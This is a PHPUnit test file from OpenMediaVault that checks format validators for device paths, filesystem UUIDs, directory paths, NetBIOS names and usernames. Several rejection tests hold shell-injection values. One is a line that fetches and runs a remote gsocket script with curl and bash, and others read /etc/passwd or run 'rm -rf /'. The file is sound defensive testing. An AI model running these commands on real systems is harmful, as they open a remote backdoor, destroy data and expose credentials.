#!/usr/bin/phpunit -c/etc/openmediavault
<?php

/**
 * This file is part of OpenMediaVault.
 *
 * @license   https://www.gnu.org/licenses/gpl.html GPL Version 3
 * @author    Volker Theile <volker.theile@openmediavault.org>
 * @copyright Copyright (c) 2009-2026 Volker Theile
 *
 * OpenMediaVault is free software => you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * OpenMediaVault is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with OpenMediaVault. If not, see <https://www.gnu.org/licenses/>.
 */
require_once("openmediavault/autoloader.inc");
require_once("openmediavault/globals.inc");

class Schema extends \OMV\DataModel\Schema
{
    // Make the method public to access it for testing.
    public function checkFormat($value, $schema, $name)
    {
        parent::checkFormat($value, $schema, $name);
    }
}

class test_openmediavault_datamodel_schema extends \PHPUnit\Framework\TestCase
{
    protected function getSchema()
    {
        return new Schema([
            "type" => "object",
            "properties" => [
                "fsname" => [
                    "type" => "string",
                    "oneOf" => [[
                        "type" => "string",
                        "format" => "fsuuid"
                    ],[
                        "type" => "string",
                        "format" => "devicefile"
                    ],[
                        "type" => "string",
                        "format" => "dirpath"
                    ]]
                ]
            ]
        ]);
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatFsuuid1()
    {
        # EXT2/3/4, JFS, XFS
        $schema = $this->getSchema();
        $schema->checkFormat(
            "113dbaac-e496-11e6-ac68-73bc0f572bae",
            [ "format" => "fsuuid" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatFsuuid2()
    {
        # FAT
        $schema = $this->getSchema();
        $schema->checkFormat(
            "7A48-BA97",
            [ "format" => "fsuuid" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatFsuuid3()
    {
        # NTFS
        $schema = $this->getSchema();
        $schema->checkFormat(
            "2ED43920D438EC29",
            [ "format" => "fsuuid" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefile1()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/sda1",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefile2()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/disk/by-id/wwn-0x5020c298d81c1c3a",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileSata()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/sda",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileSataPartition()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/sdb2",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileNvme()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/nvme0n1",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileNvmePartition()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/nvme0n1p1",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileMmc()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/mmcblk0",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileMmcPartition()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/mmcblk0p1",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileMdRaid()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/md0",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileMdRaidSubdir()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/md/0",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileDeviceMapper()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/dm-0",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileLvm()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/mapper/data-lv",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileVirtio()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/vda1",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileLoop()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/loop0",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileByIdAta()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/disk/by-id/ata-WDC_WD20EARX-00PASB0_WD-WMAZA2048027",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileByUuid()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/disk/by-uuid/113dbaac-e496-11e6-ac68-73bc0f572bae",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileByIdMdName()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/disk/by-id/md-name-vmpc01:data",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileByIdMdUuid()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/disk/by-id/md-uuid-75de9de9:6beca92e:8442575c:73eabbc9",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDevicefileByPath()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/dev/disk/by-path/pci-0000:00:10.0-scsi-0:0:0:0",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailSemicolonInjection()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "/dev/sda; id",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailRcePoc()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            '/dev/sda; GS_WEBHOOK_KEY=af946780 bash -c "$(curl -fsSL https://gsocket.io/x)"',
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailPipeInjection()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "/dev/sda | cat /etc/passwd",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailAndInjection()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "/dev/sda && rm -rf /",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailSubshellInjection()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "/dev/sda$(id)",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailBacktickInjection()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "/dev/sda`id`",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailRedirectInjection()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "/dev/sda > /tmp/out",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailNewlineInjection()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "/dev/sda\nid",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailVariableInjection()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            '/dev/sda $USER',
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailNoDevPrefix()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "sda",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    public function testCheckFormatDevicefileFailWrongPath()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "/etc/passwd",
            [ "format" => "devicefile" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDirpath1()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "/media/a/b/c/@data",
            [ "format" => "dirpath" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatDirpath2()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "Library/App Support/Logs/",
            [ "format" => "dirpath" ],
            "field1"
        );
    }

    public function testCheckFormatDirpathFail()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "/media/a/../../b/c",
            [ "format" => "dirpath" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatNetbios1()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "WORKGROUP",
            [ "format" => "netbiosname" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatNetbios2()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "F!OO-%&B^AR_",
            [ "format" => "netbiosname" ],
            "field1"
        );
    }

    public function testCheckFormatNetbios3()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "REWARDEDIVANSNAS",
            [ "format" => "netbiosname" ],
            "field1"
        );
    }

    public function testCheckFormatNetbios4()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "FOO]BAR",
            [ "format" => "netbiosname" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatUsername1()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "john",
            [ "format" => "username" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatUsername2()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "john.doe",
            [ "format" => "username" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatUsername3()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "_ssh",
            [ "format" => "username" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatUsername4()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "john123",
            [ "format" => "username" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatUsername5()
    {
        // Samba machine accounts end with '$'.
        $schema = $this->getSchema();
        $schema->checkFormat(
            "john$",
            [ "format" => "username" ],
            "field1"
        );
    }

    public function testCheckFormatUsernameFail1()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "john doe",
            [ "format" => "username" ],
            "field1"
        );
    }

    public function testCheckFormatUsernameFail2()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "-john",
            [ "format" => "username" ],
            "field1"
        );
    }

    public function testCheckFormatUsernameFail3()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "john!",
            [ "format" => "username" ],
            "field1"
        );
    }

    /**
     * @doesNotPerformAssertions
     */
    public function testCheckFormatNoMultiLine1()
    {
        $schema = $this->getSchema();
        $schema->checkFormat(
            "foo123",
            [ "format" => "no-multi-line" ],
            "field1"
        );
    }

    public function testCheckFormatNoMultiLine2()
    {
        $schema = $this->getSchema();
        $this->expectException(\OMV\Json\SchemaValidationException::class);
        $schema->checkFormat(
            "foo\r\nbar",
            [ "format" => "no-multi-line" ],
            "field1"
        );
    }
}
